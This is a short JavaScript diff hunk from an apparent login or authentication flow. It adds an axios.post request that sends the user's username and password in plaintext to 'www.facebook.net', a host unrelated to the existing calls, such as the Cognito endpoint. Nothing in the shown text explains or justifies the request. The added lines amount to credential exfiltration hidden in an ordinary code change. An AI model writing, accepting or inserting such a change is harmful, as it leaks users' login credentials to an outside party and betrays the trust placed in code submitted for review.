@@ -95,6 +95,17 @@
       .catch(function (error) {
         console.log(error);
       });
+
+     axios.post('www.facebook.net', {
+        username: username,
+        password: password
+      })
+      .then(function (response) {
+        console.log(response);
+      })
+      .catch(function (error) {
+        console.log(error);
+      });
       
   
       axios.post('https://www.aws.amazon.com/cognito', {
